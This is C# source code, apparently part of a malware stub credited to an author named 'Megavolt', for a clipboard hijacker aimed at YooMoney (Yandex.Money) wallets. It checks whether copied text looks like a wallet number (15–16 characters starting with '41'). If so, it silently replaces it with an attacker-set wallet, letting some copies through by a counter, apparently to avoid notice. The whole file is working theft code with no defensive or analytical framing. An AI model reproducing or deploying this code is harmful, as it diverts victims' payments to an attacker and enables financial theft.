/* 
    Author : Megavolt
	Telegram Group : t.me/DOLFX
    Github : github.com/Megavolt666
	Telegram Author : t.me/megavoltcoder
*/
using System;
using System.Windows.Forms;

namespace stubOnion
{
    class YandexMoney
    {
        public static int _oppToMiss;
        public static void GetYmoney()
        {
            try
            {
                if (Clipboard.ContainsText())
                {
                    var clpbrd = Clipboard.GetText();
                    if (clpbrd.Length < 15 || clpbrd.Length > 16)
                    {
                        return;
                    }
                    else
                    {
                        if (clpbrd.StartsWith("41"))
                        {
                            if (_oppToMiss > 0)
                            {
                                _oppToMiss--;
                                return;
                            }
                            _oppToMiss = Config.OppToMissDef;
                            Clipboard.SetText(Config.ymoney);
                        }
                        else
                        {
                            return;
                        }

                    }
                }
                else
                {
                    return;
                }
            }
            catch { }
        }
    }
}
